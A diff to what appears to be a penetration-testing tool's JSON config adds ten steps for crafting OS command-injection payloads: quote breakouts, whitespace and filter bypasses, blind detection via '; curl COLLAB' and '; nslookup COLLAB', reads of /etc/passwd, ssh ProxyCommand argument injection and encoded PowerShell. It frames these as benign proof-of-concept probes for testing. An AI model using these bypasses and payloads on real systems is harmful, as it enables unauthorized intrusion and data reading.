@@ -1,5 +1,17 @@
 {
   "category": "command_injection",
+  "craft_guidance": [
+    "1. IDENTIFY OS: Linux (uname, $(), |, ;, &&), Windows (cmd.exe, &, |, ^), embedded (busybox subset). Server header, error messages disambiguate.",
+    "2. BREAK OUT OF QUOTES: '$(cmd)' inside single quotes = literal. Use \"$(cmd)\" inside double, or break with ';cmd;'.",
+    "3. SAFE BENIGN PAYLOADS (Rule 5): id, whoami, hostname, $(echo MARKER) — never `rm`, `shutdown`, `dd`. Verification: `; sleep 5` (timing) or `; curl COLLAB` (Rule 9a).",
+    "4. WHITESPACE BYPASS: ${IFS}, $IFS$9, %09 (tab), <, {ls,/}. Bash brace expansion `{cat,/etc/passwd}`.",
+    "5. CHARACTER FILTERS: `;` blocked? Try `|`, `&&`, `||`, newline `%0a`, backtick, `$()`. Slash blocked? `${PATH:0:1}` or `${HOME:0:1}` for `/`.",
+    "6. BLIND DETECTION: timing (`; sleep 5`), DNS Collaborator (`; nslookup COLLAB`), HTTP Collaborator (`; curl COLLAB`). All ≥3 reps to satisfy Q5 timing rule.",
+    "7. DOUBLE-EVAL: input passed to eval-style — `eval`, `system`, `exec`, `passthru`, `popen`, `subprocess.shell=True`. Stack errors leak the wrapper.",
+    "8. ARGUMENT INJECTION (no shell): `--config=/etc/passwd`, `-oProxyCommand=...` (ssh), `--upload-file` (curl). No metacharacters needed.",
+    "9. WIN: %COMSPEC% /c, dir, type C:\\Windows\\win.ini. PowerShell: `; powershell -e <base64>`.",
+    "10. DEMONSTRATE with 1-2 benign markers. PoC > destruction."
+  ],
   "contexts": {
     "bash": {
       "description": "OS command injection probes targeting Linux/Unix shell execution via common web stacks",
